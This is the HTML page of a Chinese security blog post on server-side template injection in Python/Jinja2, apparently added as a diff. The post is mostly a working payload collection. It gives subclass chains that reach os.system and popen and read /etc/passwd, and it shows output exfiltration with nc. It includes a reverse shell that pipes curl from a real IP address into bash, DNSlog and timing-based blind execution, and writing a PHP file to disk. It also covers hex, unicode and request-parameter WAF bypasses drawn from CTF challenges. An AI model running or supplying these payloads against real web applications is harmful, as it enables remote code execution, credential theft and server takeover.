@@ -1,0 +1,423 @@
+<!DOCTYPE html>
+<!--[if lte IE 8 ]>
+<html class="ie" xmlns="http://www.w3.org/1999/xhtml" xml:lang="en-US" lang="en-US">
+<![endif]-->
+<!--[if (gte IE 9)|!(IE)]><!-->
+<!--
+***************  *      *     *
+      8          *    *       *
+      8          *  *         *
+      8          **           *
+      8          *  *         *
+      8          *    *       *
+      8          *      *     *
+      8          *        *   ***********    -----Theme By Kieran(http://go.kieran.top)
+-->
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="zh-CN" lang="zh-CN">
+<!--<![endif]-->
+
+<head>
+  <title>Further discussion on SSTI template injection | s1mple</title>
+  <!-- Meta data -->
+    <meta http-equiv="Content-Type" content="text/html" charset="UTF-8" >
+    <meta http-equiv="X-UA-Compatible" content="IE=edge"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <meta name="generator" content="s1mple">
+    <meta name="author" content="s1mple">
+    <meta name="description" content="" />
+    <meta name="keywords" content="" />
+
+    <!-- Favicon, (keep icon in root folder) -->
+    <link rel="Shortcut Icon" href="/img/favicon.ico" type="image/ico">
+
+    <link rel="alternate" href="/atom.xml" title="s1mple" type="application/atom+xml">
+    <link rel="stylesheet" href="/css/all.css" media="screen" type="text/css">
+    
+    <link rel="stylesheet" href="/highlightjs/vs.css" type="text/css">
+    
+
+    <!--[if IE 8]>
+    <link rel="stylesheet" type="text/css" href="/css/ie8.css" />
+    <![endif]-->
+
+    <!-- jQuery | Load our jQuery, with an alternative source fallback to a local version if request is unavailable -->
+    <script src="/js/jquery-1.11.1.min.js"></script>
+    <script>window.jQuery || document.write('<script src="js/jquery-1.11.1.min.js"><\/script>')</script>
+
+    <!-- Load these in the <head> for quicker IE8+ load times -->
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+    <script src="/js/html5shiv.min.js"></script>
+    <script src="/js/respond.min.js"></script>
+    <![endif]-->
+
+  
+  
+  
+
+  <style>.col-md-8.col-md-offset-2.opening-statement img{display:none;}</style>
+</head>
+
+<!--
+<body class="post-template">
+-->
+<body id="index" class="lightnav animsition">
+
+      <!-- ============================ Off-canvas navigation =========================== -->
+
+    <div class="sb-slidebar sb-right sb-style-overlay sb-momentum-scrolling">
+        <div class="sb-close" aria-label="Close Menu" aria-hidden="true">
+            <img src="/img/close.png" alt="Close"/>
+        </div>
+        <!-- Lists in Slidebars -->
+        <ul class="sb-menu">
+            <li><a href="/" class="animsition-link" title="Home">Home</a></li>
+            <li><a href="/archives" class="animsition-link" title="archive">archives</a></li>
+            <!-- Dropdown Menu -->
+			 
+            <li>
+                <a class="sb-toggle-submenu">Works<span class="sb-caret"></span></a>
+                <ul class="sb-submenu">
+                    
+                        <li><a href="/" target="_BLANK" class="animsition-link"></a></li>
+                    
+                        <li><a href="/atom.xml" target="_BLANK" class="animsition-link"></a></li>
+                    
+                </ul>
+            </li>
+            
+            
+            
+            <li>
+                <a class="sb-toggle-submenu">Links<span class="sb-caret"></span></a>
+                <ul class="sb-submenu">
+                    
+                    <li><a target="_blank" rel="noopener" href="https://blog.zeddyu.info/" class="animsition-link">陆队</a></li>
+                    
+                    <li><a target="_blank" rel="noopener" href="https://st4ck.gitee.io/" class="animsition-link">书鱼</a></li>
+                    
+                    <li><a target="_blank" rel="noopener" href="https://boluochuixue.top/" class="animsition-link">菠萝吹雪</a></li>
+                    
+                    <li><a target="_blank" rel="noopener" href="https://rmb122.com/" class="animsition-link">rmb</a></li>
+                    
+                </ul>
+            </li>
+            
+        </ul>
+        <!-- Lists in Slidebars -->
+        <ul class="sb-menu secondary">
+            
+            <li><a href="/about.html" class="animsition-link" title="about">About</a></li>
+            <li><a href="/atom.xml" class="animsition-link" title="rss">RSS</a></li>
+        </ul>
+    </div>
+    
+    <!-- ============================ END Off-canvas navigation =========================== -->
+
+    <!-- ============================ #sb-site Main Page Wrapper =========================== -->
+
+    <div id="sb-site">
+        <!-- #sb-site - All page content should be contained within this id, except the off-canvas navigation itself -->
+
+        <!-- ============================ Header & Logo bar =========================== -->
+
+        <div id="navigation" class="navbar navbar-fixed-top">
+            <div class="navbar-inner">
+                <div class="container">
+                    <!-- Nav logo -->
+                    <div class="logo">
+                        <a href="/" title="Logo" class="animsition-link">
+                         <img src="/img/logo.png" alt="Logo" width="35px;"/> 
+                        </a>
+                    </div>
+                    <!-- // Nav logo -->
+                    <!-- Info-bar -->
+                    <nav>
+                        <ul class="nav">
+                            <li><a href="/" class="animsition-link">s1mple</a></li>
+                            <li class="nolink"><span>Always </span>Creative.</li>
+                            
+                            <li><a href="https://github.com/" title="Github" target="_blank"><i class="icon-github"></i></a></li>
+                            
+                            
+                            <li><a href="https://twitter.com/" title="Twitter" target="_blank"><i class="icon-twitter"></i></a></li>
+                            
+                            
+                            <li><a href="https://www.facebook.com/" title="Facebook" target="_blank"><i class="icon-facebook"></i></a></li>
+                            
+                            
+                            <li><a href="https://google.com/" title="Google-Plus" target="_blank"><i class="icon-google-plus"></i></a></li>
+                            
+                            
+                            <li><a href="http://weibo.com/" title="Sina-Weibo" target="_blank"><i class="icon-sina-weibo"></i></a></li>
+                            
+                            <li class="nolink"><span>Welcome!</span></li>
+                        </ul>
+                    </nav>
+                    <!--// Info-bar -->
+                </div>
+                <!-- // .container -->
+                <div class="learnmore sb-toggle-right">More</div>
+                <button type="button" class="navbar-toggle menu-icon sb-toggle-right" title="More">
+                <span class="sr-only">Toggle navigation</span>
+                <span class="icon-bar before"></span>
+                <span class="icon-bar main"></span>
+                <span class="icon-bar after"></span>
+                </button>
+            </div>
+            <!-- // .navbar-inner -->
+        </div>
+
+        <!-- ============================ Header & Logo bar =========================== -->
+
+
+      
+<section id="intro">
+    <div class="container">
+        <div class="row col-md-offset-2">
+            <div class="col-md-8">
+    			<span class="post-meta">
+      <time datetime="2020-11-19T05:25:46.000Z" itemprop="datePublished">
+          2020-11-19
+      </time>
+    
+</span>
+                <h1>Further discussion on SSTI template injection</h1>
+            </div>
+        </div>
+        <div class="col-md-8 col-md-offset-2">
+      		<p>模板注入一个亘古不变的话题，现在来深入的了解一下；</p>
+<p>基础点都不再赘述；网上资料很多；这里主要分享一下在再次复现SSTI的时候发现的一些有趣的点；</p>
+<p>首先来说有一个可以直接利用的链条；</p>
+<p><code>&#39;&#39;.__class__.__mro__[-1].__subclasses__()[40](&#39;/etc/passwd&#39;).read()</code></p>
+<p>这里我们可以直接调用file类进行文件读取；这里再分享几种找到file的方法；通过简单的实践来看，我们可以找到任何有globals属性的class对其进行实例化，然后拿到全局，从而再窃取到可直接利用的函数，从而调用；</p>
+<p><code>&#39;&#39;.__class__.__mro__[-1].__subclasses__()[xx].__init__.__globals__[&#39;__builtins__&#39;][&#39;file&#39;](&#39;/etc/passwd&#39;).read()</code></p>
+<p>当然，除了file之外，我们还可以找到并利用一些内置的函数；比如eval；</p>
+<p><code>&#39;&#39;.__class__.__mro__[-1].__subclasses__()[xx].__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&#39;__import__(&quot;os&quot;).system(&quot;ls&quot;)&#39;)</code></p>
+<p><code>&#39;&#39;.__class__.__mro__[-1].__subclasses__()[xx].__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&#39;__import__(&quot;os&quot;).popen(&quot;ls&quot;).read()&#39;)</code>此种写法有的时候可以绕过waf，但是更重要的是有的时候一般的system会无回显，那么这种read的方式，可以很好的避免；</p>
+<p>当然，既然已经找到了可以调用的方法，我们也可以看到有一个open方法可以直接调用；所以可以直接调用open方法进行读取即可；</p>
+<p><code>&#39;&#39;.__class__.__mro__[-1].__subclasses__()[xx].__init__.__globals__[&#39;__builtins__&#39;][&#39;open&#39;](&#39;/etc/passwd&#39;).read()</code></p>
+<p>既然之前调用的eval函数，然后进行导入模块os去执行，那么我们可以直接导入os模块然后去进行命令执行；建议利用<code>warnings.catch_warnings</code>和<code>codecs.IncrementalEncoder</code>这两个类；</p>
+<p><code>&#39;&#39;.__class__.__mro__[2].__subclasses__()[xx].__init__.__globals__[&#39;sys&#39;].modules[&#39;os&#39;].system(&#39;ls&#39;)</code></p>
+<p><code>&#39;&#39;.__class__.__mro__[2].__subclasses__()[xx].__init__.__globals__[&#39;sys&#39;].modules[&#39;os&#39;].popen(&#39;ls&#39;).read()</code></p>
+<p>第二个payload和之前的原理一样，都是为了解决无回显的问题；这里我们只需要找到有globals的一个class，从而对其进行实例化然后拿到全局，就可以进行攻击；因为后面调用的module或者module下的函数，基本上我们在每个class类实例化之后都可以找到；只有极少数的class是无globals的；比如：<code>site._Helper</code>;所以这种方法也差不多可以理解为通杀的方法；</p>
+<p>或者采取更加简单的方法我们可以在基类的子类中找到一个子类，在其全局中就可以直接调用os模块；找到这个类：<code>site._Printer</code>这个类中存在导入的os模块，这可以使攻击者直接使用进行攻击；</p>
+<p><code>&#39;&#39;.__class__.__mro__[-1].__subclasses__()[71].__init__.__globals__[&#39;os&#39;].system(&quot;ls&quot;)</code></p>
+<p><code>&#39;&#39;.__class__.__mro__[-1].__subclasses__()[71].__init__.__globals__[&#39;os&#39;].popen(&quot;ls&quot;).read()</code>用来解决无回显的问题；（留个小点后面细说</p>
+<p>一点小感悟：</p>
+<p>在进行SSTI复现的时候，发现在调用全局之后，我们如果想具体的调用某个方法，还是得需要去调用模块，然后进而去调用方法，globals在获取全局之后，后面需要调用的是一个模块，只有调用了模块，才可以继续调用方法，当然，除了直接调用os模块之外，也是可以间接调用os这种的模块，那么就直接可以后接命令执行即可；但是前提是存在全局中引用os模块的类，也就是<code>site._Printer</code>这样的类；当然除了<code>site._Printer</code>之外，我还找到了<code>site.Quitter</code>在其中也是可以间接调用os模块的，其他我暂时未发现；利用os模块从而可以直接进行后接命令攻击；</p>
+<p><code>&#39;&#39;.__class__.__mro__[-1].__subclasses__()[59].__init__.__globals__[&#39;linecache&#39;].os.system(&#39;ls&#39;)</code></p>
+<p><code>&#39;&#39;.__class__.__mro__[-1].__subclasses__()[59].__init__.__globals__[&#39;linecache&#39;].os.popen(&#39;ls&#39;).read()</code></p>
+<p><code>&#39;&#39;.__class__.__mro__[-1].__subclasses__()[76].__init__.__globals__[&#39;os&#39;].system(&quot;ls&quot;)</code></p>
+<p><code>&#39;&#39;.__class__.__mro__[-1].__subclasses__()[76].__init__.__globals__[&#39;os&#39;].popen(&quot;ls&quot;).read()</code></p>
+<h2 id="解决无回显和WAF的问题"><a href="#解决无回显和WAF的问题" class="headerlink" title="解决无回显和WAF的问题"></a><strong>解决无回显和WAF的问题</strong></h2><p>解决无回显问题，除了之前说的利用popen结合read来读取之外，如果靶机可以通外网，那么可以利用nc进行转发；其利用也是调用system然后进行命令执行然后通过管道符进行命令拼接，从而可以实现回显结果外带；这里payload很多，只要可以拿到system就可以实现；举几个例子：</p>
+<p><code>&#39;&#39;.__class__.__mro__[-1].__subclasses__()[59].__init__.__globals__[&#39;linecache&#39;].os.system(&#39;ls | nc xxxxx port&#39;)</code></p>
+<p>载荷效果如下：</p>
+<p><a target="_blank" rel="noopener" href="https://imgchr.com/i/Bv8aIH"><img src="https://s3.ax1x.com/2020/11/11/Bv8aIH.png" alt="Bv8aIH.png"></a></p>
+<p><a target="_blank" rel="noopener" href="https://imgchr.com/i/Bv8YqO"><img src="https://s3.ax1x.com/2020/11/11/Bv8YqO.png" alt="Bv8YqO.png"></a></p>
+<p>当然，这种的一次性的交互毕竟比较麻烦，如果可以，则也可以实现shell反弹，具体也可以利用system进行命令反弹；具体的反弹shell的方法，网上也很多种，也可以结合system来进行；给出一个payload；</p>
+<p><code>&#39;&#39;.__class__.__mro__[-1].__subclasses__()[59].__init__.__globals__[&#39;linecache&#39;].os.system(&#39;curl 120.53.29.60:8888|bash&#39;)</code></p>
+<p><a target="_blank" rel="noopener" href="https://imgchr.com/i/Bv8GM6"><img src="https://s3.ax1x.com/2020/11/11/Bv8GM6.png" alt="Bv8GM6.png"></a></p>
+<p><a target="_blank" rel="noopener" href="https://imgchr.com/i/Bv8JsK"><img src="https://s3.ax1x.com/2020/11/11/Bv8JsK.png" alt="Bv8JsK.png"></a></p>
+<p>上述使用的是curl的反弹shell的方法，其实也是可以使用其他的反弹shell方法，其根本原理也就是我们调用了system所以可以命令执行；所以解决无回显问题，还是最好找到system；其实python环境不见得所有都一样，所以建议还是按照相应得类来找system比较合适，因为上述payload不见得在所有得环境下都可以攻击成功，还是需要在对应得环境中找到相应得system才可攻击成功；</p>
+<h2 id="通过dnslog突破无回显命令执行"><a href="#通过dnslog突破无回显命令执行" class="headerlink" title="通过dnslog突破无回显命令执行"></a><strong>通过dnslog突破无回显命令执行</strong></h2><p>和之前一样，我们拿到system方法之后可以 <code>curl `whoami`.域名</code>可以通过dnslog实现回显外带；</p>
+<h2 id="继承链和rce盲注结合"><a href="#继承链和rce盲注结合" class="headerlink" title="继承链和rce盲注结合"></a><strong>继承链和rce盲注结合</strong></h2><p><code>&#39;&#39;.__class__.__mro__[-1].__subclasses__()[59].__init__.__globals__[&#39;linecache&#39;].os.system(&#39;sleep $(whoami | cut -c 1 |tr r 5)&#39;)</code> 即刻达到盲注得效果；</p>
+<h2 id="拓展攻击面直接写马"><a href="#拓展攻击面直接写马" class="headerlink" title="拓展攻击面直接写马"></a><strong>拓展攻击面直接写马</strong></h2><p>上面说到了解决无回显问题；那么接着无回显得问题拓展一下攻击面；我们拿到system，但是命令执行无回显，并且也无法出外网得情况下，可考虑写入shell；直接调用file类或者system写入即可；前提也是需要有写入权限；不过概率一般不大，也是为了避免搅屎，但是有的时候也可以尝试直接拿shell；</p>
+<p><code>&#39;&#39;.__class__.__mro__[-1].__subclasses__()[59].__init__.__globals__[&#39;linecache&#39;].os.system(&#39;echo &quot;&lt;?php phpinfo();?&gt;&quot;&gt;a.php&#39;)</code> 即可完成写入；其实这种得payload很多，我们可以利用很多链条找到os模块从而调用system方法；或者也可以就之前所说直接file写入即可；</p>
+<p><a target="_blank" rel="noopener" href="https://imgchr.com/i/Bv8Ude"><img src="https://s3.ax1x.com/2020/11/11/Bv8Ude.png" alt="Bv8Ude.png"></a></p>
+<h2 id="利用json格式和print突破ssti无回显"><a href="#利用json格式和print突破ssti无回显" class="headerlink" title="利用json格式和print突破ssti无回显"></a><strong>利用json格式和print突破ssti无回显</strong></h2><p>灵感来源于上海大学生的一个web之ssti的题，当时测试一直无回显，本来想着</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;%<span class="keyword">if</span>%&#125;<span class="number">1</span>&#123;%endif%&#125;</span><br></pre></td></tr></table></figure>
+
+<p> 进行盲注，找到了摸索很久找到了可以弹shell的模块，但是后来发现无法出网，太艹了；但是想来之前一篇文章中有利用json格式进行ssti注入的点，这里测试了下，发现可以回显后面的value，那么要回显之前的key，在之前加入print进行输出；然后利用json格式的解析进行回显；</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;&#123;%print &#x27;&#x27;.__xxxxx%&#125;&quot;</span>,<span class="string">&quot;number&quot;</span>&#125;</span><br></pre></td></tr></table></figure>
+
+<p>即可进行回显攻击；</p>
+<h2 id="利用十六进制结合渲染突破waf"><a href="#利用十六进制结合渲染突破waf" class="headerlink" title="利用十六进制结合渲染突破waf"></a><strong>利用十六进制结合渲染突破waf</strong></h2><p>此种写法在模板渲染的时候可以使用，但是在python环境直接测试确实无法使用的；用这种方法可以突破对小数点和下划线还有单引号的过滤；</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;<span class="string">&quot;&quot;</span>.__class__&#125;&#125;</span><br><span class="line">&#123;&#123;<span class="string">&quot;&quot;</span>[<span class="string">&quot;\x5f\x5fclass\x5f\x5f&quot;</span>]&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>两种方法等价；这里\x5f即是我们的下划线；那么利用这种写法我们上述的各种方式都是可以改变的；</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;<span class="string">&quot;&quot;</span>[<span class="string">&quot;\x5f\x5fclass\x5f\x5f&quot;</span>][<span class="string">&quot;\x5F\x5Fbases\x5F\x5F&quot;</span>][<span class="number">0</span>][<span class="string">&quot;\x5F\x5Fsubclasses\x5F\x5F&quot;</span>]()[<span class="number">57</span>]&#125;&#125;</span><br><span class="line"><span class="comment">#也就是</span></span><br><span class="line">&#123;&#123;<span class="string">&quot;&quot;</span>.__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">57</span>]&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>后面的利用链在上述都有利用的payload；师傅们可以自行转化，这里不再转化；</p>
+<p>列举一个华为的CTF的竞赛题；当时三个web都是考的SSTI；一个是利用cookie结合request进行传参绕过；还有一个是利用十六进制进行绕过；当时过滤了双大括号，可以利用</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;%%&#125;</span><br></pre></td></tr></table></figure>
+
+<p>进行绕过，然后利用print进行外带；当时过滤了很多字符，可以直接全部利用hex进行转化；利用括号进行窃取全局变量，放出当时的payload；</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;%print(()|attr(<span class="string">&quot;\x5f\x5f\x63\x6c\x61\x73\x73\x5f\x5f&quot;</span>)|attr(<span class="string">&quot;\x5f\x5f\x62\x61\x73\x65\x5f\x5f&quot;</span>)|attr(<span class="string">&quot;\x5f\x5f\x73\x75\x62\x63\x6c\x61\x73\x73\x65\x73\x5f\x5f&quot;</span>)()|attr(<span class="string">&quot;\x5f\x5f\x67\x65\x74\x69\x74\x65\x6d\x5f\x5f&quot;</span>)(<span class="number">202</span>)|attr(<span class="string">&quot;\x5f\x5f\x69\x6e\x69\x74\x5f\x5f&quot;</span>)|attr(<span class="string">&quot;\x5f\x5f\x67\x6c\x6f\x62\x61\x6c\x73\x5f\x5f&quot;</span>)|attr(<span class="string">&quot;\x5f\x5f\x67\x65\x74\x69\x74\x65\x6d\x5f\x5f&quot;</span>)(<span class="string">&quot;\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f&quot;</span>)|attr(<span class="string">&quot;\x5f\x5f\x67\x65\x74\x69\x74\x65\x6d\x5f\x5f&quot;</span>)(<span class="string">&quot;\x65\x76\x61\x6c&quot;</span>)(<span class="string">&quot;\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f\x28\x22\x6f\x73\x22\x29\x2e\x70\x6f\x70\x65\x6e\x28\x27\x63\x61\x74\x20\x66\x6c\x61\x67\x2e\x74\x78\x74\x27\x29\x2e\x72\x65\x61\x64\x28\x29&quot;</span>))%&#125;</span><br></pre></td></tr></table></figure>
+
+<p>利用hex结合attr过滤器，从而进行ssti的完成，直接执行popen；结合read进行回显；</p>
+<p><a target="_blank" rel="noopener" href="https://imgchr.com/i/rIRAl4"><img src="https://s3.ax1x.com/2020/12/27/rIRAl4.png" alt="rIRAl4.png"></a></p>
+<p>另外一个ssti是在后台，前端是个sql注入，测试之后是sqlite数据库，考的很明确，过滤了一些简单的字符，进行注入之后进入user表下的用户名admin和密码，然后拿到密码之后，进入后台获得admin的权限；然后有个查找留言的框；经过简单的fuzz之后再次发现了sql注入，和原本的sql注入的payload一样，当时以为可以注入出后两个表，后来发现不行，然后想到一个考点是sql结合了ssti进行攻击，所以当时测试了下，发现在guest发生错误的时候，程序会进行渲染，而且是单个字符；测试发现<code>&#123;&#123;2*2&#125;&#125;</code>可以回显4，所以直接测试ssti攻击，直接拿着之前的payload进行攻击，可以直接拿到flag；</p>
+<p><a target="_blank" rel="noopener" href="https://imgchr.com/i/rIRkpF"><img src="https://s3.ax1x.com/2020/12/27/rIRkpF.png" alt="rIRkpF.png"></a></p>
+<h2 id="利用unicode结合渲染突破waf"><a href="#利用unicode结合渲染突破waf" class="headerlink" title="利用unicode结合渲染突破waf"></a><strong>利用unicode结合渲染突破waf</strong></h2><p>这种方法在之前的太湖杯中有用到过，当时是字符规范化利用点，利用unicode的不规范化字符从而经过引擎处理之后使其规范化从而拼接达到SSTI的效果；这里也可以直接利用unicode编码去绕过；</p>
+<p>将我们需要绕过的字符进行unicode编码；也是可以结合一些过滤器进行使用；</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;%print(lipsum|attr(%<span class="number">22</span>\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f%<span class="number">22</span>))|attr(%<span class="number">22</span>\u005f\u005f\u0067\u0065\u0074\u0069\u0074\u0065\u006d\u005f\u005f%<span class="number">22</span>)(%<span class="number">22</span>os%<span class="number">22</span>)|attr(%<span class="number">22</span>popen%<span class="number">22</span>)(%<span class="number">22</span>whoami%<span class="number">22</span>)|attr(%<span class="number">22</span>read%<span class="number">22</span>)()%&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这个是安洵杯的一个SSTI的payload；可以看出unicode可以再某些渲染中直接绕过；</p>
+<h2 id="利用request变量突破下划线的限制"><a href="#利用request变量突破下划线的限制" class="headerlink" title="利用request变量突破下划线的限制"></a><strong>利用request变量突破下划线的限制</strong></h2><p>在flask框架进行注入的时候；可以用request变量来突破；因为request变量可以访问到我们提交的变量那么就可以使用<code>request.args.&lt;param&gt;</code>语法然后在我们的渲染后面传入参数从而绕过waf后进行拼接达到SSTI注入效果；</p>
+<p>比如：</p>
+<p><code>&#123;&#123;request[request.args.s1mple]&#125;&#125;&amp;s1mple=__class__</code> 就可以成功绕过；</p>
+<h2 id="在此基础上绕过request-request"><a href="#在此基础上绕过request-request" class="headerlink" title="在此基础上绕过request[request"></a><strong>在此基础上绕过<code>request[request</code></strong></h2><p>基于上述的方法，如果我们还是无法绕过的话，可能是我们的request[request惨遭过滤，这时候就需要用到jinja2模板的内置过滤器来辅助；</p>
+<p>在jinja2中有一个attr过滤器；这个过滤器可以获得对象的属性</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">attr(obj, name)</span><br><span class="line">Get an attribute of an <span class="built_in">object</span>. foo|attr(<span class="string">&quot;bar&quot;</span>) works like foo[<span class="string">&quot;bar&quot;</span>] just that always an attribute <span class="keyword">is</span> returned <span class="keyword">and</span> items are <span class="keyword">not</span> looked up.</span><br></pre></td></tr></table></figure>
+
+<p><code>&#123;%print(lipsum|attr("__globals__"))|attr("__getitem__")("os")|attr("popen")("whoami")|attr("read")()%&#125;</code></p>
+<p>首先拿到全局，然后在全局下搜索到os模块，然后触发os模块下的popen函数然后read进行回显；可以看成attr这个过滤器充当了点的角色；</p>
+<h2 id="继续在上述基础上绕过-class"><a href="#继续在上述基础上绕过-class" class="headerlink" title="继续在上述基础上绕过__class__"></a><strong>继续在上述基础上绕过<code>__class__</code></strong></h2><p>因为jinja2中支持管道+jion的方法；所以这可以进行拼接</p>
+<p><code>&#123;&#123;request|attr([request.args.usc*2,request.args.class,request.args.usc*2]|join)&#125;&#125;&amp;class=class&amp;usc=_</code></p>
+<p>解释一下解析流程，首先读取后面的变量将其放入到对应的参数点，然后再进行payload中的运算，比如usc*2;最后进行attr过滤器的调用；进行获得属性；最后拼接成<code>&#123;&#123;request._\_class_\_&#125;&#125;</code></p>
+<h2 id="继续接着上述绕过中括号"><a href="#继续接着上述绕过中括号" class="headerlink" title="继续接着上述绕过中括号"></a><strong>继续接着上述绕过中括号</strong></h2><p>可以使用getlist从而得到一个列表；利用函数构造出我们需要的数组格式；</p>
+<p><code>&#123;&#123;request|attr(request.args.getlist(request.args.g)|join)&#125;&#125;&amp;g=a&amp;a=_&amp;a=_&amp;a=class&amp;a=_&amp;a=_</code></p>
+<p>如此就可以形成<code>getlist(__class__)</code>的效果；最后就是<code>[__class__]</code>；自然也就会引入中括号；</p>
+<p><code>&#123;&#123;''|attr(__class__)|attr(__mro__)request.args.getlist(a)|attr(__subclasses__()request.args.getlist(b))|attr(__init__)|attr(__globals__)request.args.getlist(c)|attr("os")|attr("system")("ls")&#125;&#125;&amp;a=-1&amp;b=[59]&amp;c=&#39;linecache&#39;</code></p>
+<p>当然，不用这种方法也是可以的；这种只是方法之一；</p>
+<h2 id="结尾"><a href="#结尾" class="headerlink" title="结尾"></a><strong>结尾</strong></h2><p>其实这种拓展攻击面也不算是新得拓展，只是老生常谈得一些姿势；今天偶然兴起，就分享一下；也算是对SSTI得回顾；</p>
+
+            <div class="clearfix"></div>
+            <hr class="nogutter">
+        </div>
+        <nav class="m-pagination col-md-8 col-md-offset-2 col-sm-24" role="pagination">
+    
+    <a class="pull-left" href="/2020/11/19/Complex-syntax-of-PHP-variable-parsing/" style="float: left;">
+        ← Complex syntax of PHP variable parsing
+    </a>
+    
+    
+    <a class="pull-right" href="/2020/11/18/Yii2-deserialization-rce-pop-chain-analysis/">
+        Yii2 deserialization rce pop chain analysis →
+    </a>
+    
+</nav>
+
+        <div class="col-md-8 col-md-offset-2 col-sm-24"><script type="text/javascript">
+  /**
+   * 搜狐畅言
+   */
+
+  /*
+  document.write('<div id="SOHUCS" sid="' + window.location.pathname.slice(1) + '" ></div>');
+
+  window.onload = function () {
+    (function () {
+      var appid = 'cytXXXX';
+      var conf = 'prod_xxxxxxxxxxxxxxxxx';
+      var width = window.innerWidth || document.documentElement.clientWidth;
+      var loadJs = function (d, a, id) {
+        var c = document.getElementsByTagName("head")[0] || document.head || document.documentElement;
+        var b = document.createElement("script");
+        b.setAttribute("type", "text/javascript");
+        b.setAttribute("charset", "UTF-8");
+        b.setAttribute("src", d);
+        if (id) {
+          b.setAttribute("id", id);
+        }
+        if (typeof a === "function") {
+          if (window.attachEvent) {
+            b.onreadystatechange = function () {
+              var e = b.readyState;
+              if (e === "loaded" || e === "complete") {
+                b.onreadystatechange = null;
+                a()
+              }
+            }
+          } else {
+            b.onload = a
+          }
+        }
+        c.appendChild(b)
+      };
+
+      loadJs("https://changyan.sohu.com/upload/changyan.js", function () {
+        window.changyan.api.config({
+          appid: appid,
+          conf: conf
+        })
+      });
+    })();
+  }
+  */
+
+</script>
+</div>
+    </div>
+</section>
+
+
+      
+<!-- ============================ Footer =========================== -->
+
+<footer>
+    <div class="container">
+            <div class="copy">
+                <p>
+                    &copy; 2014<script>new Date().getFullYear()>2010&&document.write("-"+new Date().getFullYear());</script>, Content By s1mple. All Rights Reserved.
+                </p>
+                <p>Theme By <a target="_blank" rel="noopener" href="//go.kieran.top" style="color: #767D84">Kieran</a></p>
+            </div>
+            <div class="social">
+                <ul>
+                    
+                    <li><a href="https://github.com/" title="Github" target="_blank"><i class="icon-github"></i></a>&nbsp;</li>
+                    
+                    
+                    <li><a href="https://twitter.com/" title="Twitter" target="_blank"><i class="icon-twitter"></i></a>&nbsp;</li>
+                    
+                    
+                    <li><a href="https://www.facebook.com/" title="Facebook" target="_blank"><i class="icon-facebook"></i></a>&nbsp;</li>
+                    
+                    
+                    <li><a href="https://google.com/" title="Google-Plus" target="_blank"><i class="icon-google-plus"></i></a>&nbsp;</li>
+                    
+                    
+                    <li><a href="http://weibo.com/" title="Sina-Weibo" target="_blank"><i class="icon-sina-weibo"></i></a>&nbsp;</li>
+                    
+                </ul>
+            </div>
+            <div class="clearfix"> </div>
+        </div>
+</footer>
+
+<!-- ============================ END Footer =========================== -->
+      <!-- Load our scripts -->
+<!-- Resizable 'on-demand' full-height hero -->
+<script type="text/javascript">
+    var resizeHero = function () {
+        var hero = $(".cover,.heightblock"),
+            window1 = $(window);
+        hero.css({
+            "height": window1.height()
+        });
+    };
+
+    resizeHero();
+
+    $(window).resize(function () {
+        resizeHero();
+    });
+</script>
+<script src="/js/plugins.min.js"></script><!-- Bootstrap core and concatenated plugins always load here -->
+<script src="/js/scripts.js"></script><!-- Theme scripts -->
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+$('#intro').find('img').each(function(){
+  var alt = this.alt;
+
+  if (alt){
+    $(this).after('<span class="caption" style="display:none">' + alt + '</span>');
+  }
+
+  $(this).wrap('<a href="' + this.src + '" title="' + alt + '" class="fancybox" rel="gallery" />');
+});
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
+</script>
+
+
+
+      
+</body>
+</html>
